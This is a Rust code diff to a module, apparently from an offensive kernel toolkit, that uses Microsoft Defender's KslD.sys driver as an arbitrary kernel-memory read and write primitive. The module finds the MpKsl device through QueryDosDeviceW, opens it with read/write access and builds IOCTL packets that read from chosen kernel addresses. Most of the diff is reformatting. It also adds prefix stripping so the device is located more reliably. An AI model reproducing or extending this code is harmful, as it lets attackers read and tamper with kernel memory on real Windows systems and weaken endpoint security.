@@ -49,8 +49,15 @@ use crate::{KernelRw, KitError, KrwError};
 /// dos-device mappings via `QueryDosDeviceW` to find the real `MpKslXXXX`
 /// device and construct `\\.\Global\MpKslXXXX`.
 pub const KSLD_DEFAULT_DEVICE: &[u16] = &[
-    '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-    'M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16,
+    '\\' as u16,
+    '\\' as u16,
+    '.' as u16,
+    '\\' as u16,
+    'M' as u16,
+    'p' as u16,
+    'K' as u16,
+    's' as u16,
+    'l' as u16,
 ];
 
 /// KslD.sys read IOCTL code (arbitrary kernel VA → user buffer).
@@ -126,16 +133,42 @@ mod windows_impl {
     ) -> u32;
 
     /// MpKsl prefix in UTF-16 for device name matching during enumeration.
-    const MPKSL_PREFIX_U16: [u16; 5] = [
-        'M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16,
-    ];
+    const MPKSL_PREFIX_U16: [u16; 5] = ['M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16];
 
     /// Win32 device path prefix for the global dos-device namespace.
     const GLOBAL_PREFIX_U16: &[u16] = &[
-        '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-        'G' as u16, 'l' as u16, 'o' as u16, 'b' as u16, 'a' as u16, 'l' as u16,
+        '\\' as u16,
+        '\\' as u16,
+        '.' as u16,
+        '\\' as u16,
+        'G' as u16,
+        'l' as u16,
+        'o' as u16,
+        'b' as u16,
+        'a' as u16,
+        'l' as u16,
         '\\' as u16,
     ];
+
+    /// `\DosDevices\` prefix returned by `QueryDosDeviceW` for some entries.
+    const DOS_DEVICES_PREFIX_U16: &[u16] = &[
+        '\\' as u16,
+        'D' as u16,
+        'o' as u16,
+        's' as u16,
+        'D' as u16,
+        'e' as u16,
+        'v' as u16,
+        'i' as u16,
+        'c' as u16,
+        'e' as u16,
+        's' as u16,
+        '\\' as u16,
+    ];
+
+    /// `\??\` prefix returned by `QueryDosDeviceW` for other entries.
+    const QUESTION_QUESTION_PREFIX_U16: &[u16] =
+        &['\\' as u16, '?' as u16, '?' as u16, '\\' as u16];
 
     /// Try to enumerate the KslD device name dynamically via `QueryDosDeviceW`.
     ///
@@ -146,8 +179,7 @@ mod windows_impl {
     /// Returns `None` if no MpKsl device is found (Defender not running / KslD
     /// not loaded / device name changed beyond recognition).
     fn enumerate_ksld_device() -> Option<alloc::vec::Vec<u16>> {
-        let qddw: QueryDosDeviceWFn =
-            resolve_sym(b"kernel32.dll", b"QueryDosDeviceW").ok()?;
+        let qddw: QueryDosDeviceWFn = resolve_sym(b"kernel32.dll", b"QueryDosDeviceW").ok()?;
 
         // QueryDosDeviceW with NULL device_name returns all dos-device mappings.
         // Start with 64 KiB; the API double-NUL terminates the list.
@@ -169,10 +201,16 @@ mod windows_impl {
                 if ch == 0 {
                     if start < i {
                         let name = &names[start..i];
-                        // Check if this name matches the MpKsl prefix.
-                        if name.len() >= MPKSL_PREFIX_U16.len()
-                            && name[..5] == MPKSL_PREFIX_U16
-                        {
+                        // Strip possible `\DosDevices\` or `\??\` prefix before matching
+                        // the MpKsl prefix (starts_with already handles the length check).
+                        let trimmed = if name.starts_with(DOS_DEVICES_PREFIX_U16) {
+                            &name[DOS_DEVICES_PREFIX_U16.len()..]
+                        } else if name.starts_with(QUESTION_QUESTION_PREFIX_U16) {
+                            &name[QUESTION_QUESTION_PREFIX_U16.len()..]
+                        } else {
+                            &name[..]
+                        };
+                        if trimmed.starts_with(&MPKSL_PREFIX_U16) {
                             // Build the Win32 device path: \\.\Global\<name>
                             let mut path: alloc::vec::Vec<u16> = alloc::vec::Vec::with_capacity(
                                 GLOBAL_PREFIX_U16.len() + name.len() + 1,
@@ -255,7 +293,7 @@ mod windows_impl {
                         0xC0_00_00_00, // GENERIC_READ | GENERIC_WRITE
                         0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
                         ptr::null_mut(),
-                        0x03,          // OPEN_EXISTING
+                        0x03, // OPEN_EXISTING
                         0,
                         ptr::null_mut(),
                     )
@@ -334,8 +372,7 @@ mod windows_impl {
                     .copy_from_slice(&(kaddr.wrapping_add(offset) as u64).to_le_bytes());
                 pkt[KSLD_SIZE_OFF..KSLD_SIZE_OFF + 4]
                     .copy_from_slice(&(chunk as u32).to_le_bytes());
-                pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8]
-                    .copy_from_slice(&buf_ptr.to_le_bytes());
+                pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8].copy_from_slice(&buf_ptr.to_le_bytes());
 
                 let mut bytes_returned: u32 = 0;
                 let ok = unsafe {
@@ -375,8 +412,7 @@ mod windows_impl {
                     .copy_from_slice(&(kaddr.wrapping_add(offset) as u64).to_le_bytes());
                 pkt[KSLD_SIZE_OFF..KSLD_SIZE_OFF + 4]
                     .copy_from_slice(&(chunk as u32).to_le_bytes());
-                pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8]
-                    .copy_from_slice(&buf_ptr.to_le_bytes());
+                pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8].copy_from_slice(&buf_ptr.to_le_bytes());
 
                 let mut bytes_returned: u32 = 0;
                 let ok = unsafe {
@@ -521,8 +557,15 @@ mod tests {
     #[test]
     fn default_device_path_matches_expected() {
         let expected: &[u16] = &[
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            'M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16,
+            '\\' as u16,
+            '\\' as u16,
+            '.' as u16,
+            '\\' as u16,
+            'M' as u16,
+            'p' as u16,
+            'K' as u16,
+            's' as u16,
+            'l' as u16,
         ];
         assert_eq!(&KSLD_DEFAULT_DEVICE[..expected.len()], expected);
     }
